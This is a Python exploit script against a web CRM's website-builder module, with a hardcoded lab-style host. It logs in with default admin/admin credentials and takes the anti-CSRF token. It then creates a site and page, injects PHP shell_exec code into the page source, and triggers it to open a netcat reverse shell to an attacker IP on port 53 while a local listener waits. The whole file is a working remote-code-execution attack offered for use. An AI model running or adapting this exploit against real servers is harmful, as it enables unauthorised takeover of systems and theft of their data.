#!/usr/bin/env python3
import requests
import string
import random
import os
import threading
import sys

# Attacker Info
lhost = '10.10.14.12'
lport = '53' # Firewalls usually do not block this port
# Hopefully nc is installed on the target
cmd = f'rm -f /dev/shm/.a;mkfifo /dev/shm/.a;cat /dev/shm/.a|sh 2>&1|nc {lhost} {lport} > /dev/shm/.a' 


# Target Info
user = 'admin' # Default creds => admin / admin
passw = 'admin'
vhost = 'www.fake-example.com'
ip = '10.10.14.11'
port = '80' # change to 443 is tls is enabled 
schema = 'http' # Change to https if tls is enabled
base_dir = '/' 


def handler(lport):
    # We must have nc installed locally
    os.system(f'nc -nvlp {lport}')


def get_security_tokens(vhost, ip, port, base_dir, schema):
    headers = {
        'Host': f'{vhost}',
        'User-Agent': 'neo'
    }
    params = {
        'mainmenu': 'home'
    }
    response = requests.get(f'{schema}://{ip}:{port}{base_dir}index.php', params=params, headers=headers, verify=False)
    for line in response.text.split('\n'):
        if 'newtoken' in line:
            token = line.split('"')[3]
    cookie_name, cookie_value  = response.headers['Set-Cookie'].split(';')[0].split('=')
    return token, cookie_name, cookie_value


def login(vhost, ip, port, base_dir, schema, user, passw, token, cookie_name, cookie_value):
    cookies = {
        cookie_name: cookie_value
    }
    headers = {
        'Host': f'{vhost}',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'neo'
    }
    params = {
        'mainmenu': 'home'
    }
    data = {
        'token': token,
        'actionlogin': 'login',
        'loginfunction': 'loginfunction',
        'username': user,
        'password': passw
    }
    response = requests.post(
        f'{schema}://{ip}:{port}{base_dir}index.php', 
        params=params, 
        cookies=cookies,
        headers=headers, 
        data=data, 
        verify=False, 
        allow_redirects=False
    )
    if '/admin/index.php' in response.headers['Location']:
        return True
    return False


def create_site(vhost, ip, port, base_dir, schema, token, cookie_name, cookie_value, site):
    cookies = {
        cookie_name: cookie_value
    }
    headers = {
        'Host': f'{vhost}',
        'User-Agent': 'neo'
    }
    files = {
        'token': (None, token),
        'action': (None, 'addsite'),
        'WEBSITE_REF': (None, site),
        'WEBSITE_LANG': (None, 'en'),
        'addcontainer': (None, 'Create'),
    }
    response = requests.post(
        f'{schema}://{ip}:{port}{base_dir}website/index.php',
        cookies=cookies,
        headers=headers,
        files=files,
        verify=False,
        allow_redirects=False
    )
    if f'/website/index.php?website={site}' in response.headers['Location']:
        return True
    return False


def add_page(vhost, ip, port, base_dir, schema, token, cookie_name, cookie_value, site, page):
    cookies = {
        cookie_name: cookie_value
    }
    headers = {
        'Host': f'{vhost}',
        'User-Agent': 'neo'
    }
    files = {
        'token': (None, token),
        'action': (None, 'addcontainer'),
        'website': (None, site),
        'WEBSITE_TYPE_CONTAINER': (None, 'page'),
        'sample': (None, 'empty'),
        'WEBSITE_TITLE': (None, page),
        'WEBSITE_PAGENAME': (None, page),
        'addcontainer': (None, 'Create'),
    }
    response = requests.post(
        f'{schema}://{ip}{base_dir}website/index.php',
        cookies=cookies,
        headers=headers,
        files=files,
        verify=False,
        allow_redirects=False
    )
    if f'bodywebpage-{page}' in response.text:
        return True
    return False


def edit_page(vhost, ip, port, base_dir, schema, token, cookie_name, cookie_value, site, cmd):
    payload = bytes(f'<section id="sec" contenteditable="true"><?PHP echo shell_exec(\'{cmd}\'); ?></section>\n'.encode())
    cookies = {
        cookie_name: cookie_value
    }
    headers = {
        'Host': f'{vhost}',
        'User-Agent': 'neo'
    }
    files = {
        'token': (None, token),
        'action': (None, 'updatesource'),
        'website': (None, site),
        'update': (None, 'Save'),
        'PAGE_CONTENT': (None, payload)
    }
    response = requests.post(
        f'{schema}://{ip}:{port}{base_dir}website/index.php',
        cookies=cookies,
        headers=headers,
        files=files,
        verify=False,
        allow_redirects=False
    )


def trigger_execution(vhost, ip, port, base_dir, schema, token, cookie_name, cookie_value, site, page):
    cookies = {
        cookie_name: cookie_value
    }
    headers = {
        'Host': f'{vhost}',
        'User-Agent': 'neo'
    }
    params = {
        'website': site,
        'pageref': page,
    }
    response = requests.get(
        'http://crm.board.htb/public/website/index.php',
        params=params,
        cookies=cookies,
        headers=headers,
        verify=False
    )
  # This is not a blind command execution!
  # remove the comment bellow to see the command output
  # print(response.text) # Ugly output warning **


if __name__ == '__main__':
    site = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    page = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    token, cookie_name, cookie_value =  None, None, None
    
    # Let's attemp to extract the anti csrf token
    token, cookie_name, cookie_value  = get_security_tokens(vhost, ip, port, base_dir, schema)
    if token is None:
        print('Could not extract csrf token! aborting!')
        sys.exit(1)
    
    # Now, time to login! hopefully our creds are valid
    auth = login(vhost, ip, port, base_dir, schema, user, passw, token, cookie_name, cookie_value)
    if auth == False:
        print('Invalid credentials! aborting!')
        sys.exit(1)

    # First we need to create a new site
    created = create_site(vhost, ip, port, base_dir, schema, token, cookie_name, cookie_value, site)
    if created == False:
        print('Could not create site! are we Admin? aborting!')
        sys.exit(1)

    # Cool, now we are adding a html page, we are gonna use to inject php code later 
    added = add_page(vhost, ip, port, base_dir, schema, token, cookie_name, cookie_value, site, page)
    if added == False:
        print('Something went wrong! We were not able to add page, maybe try again?')
        sys.exit(1)

    # Perfect, if we got this far we should be able to exploit the target!
    t = threading.Thread(target=handler, args=(lport,))
    t.start()
    edit_page(vhost, ip, port, base_dir, schema, token, cookie_name, cookie_value, site, cmd)
    trigger_execution(vhost, ip, port, base_dir, schema, token, cookie_name, cookie_value, site, page)
    t.join()

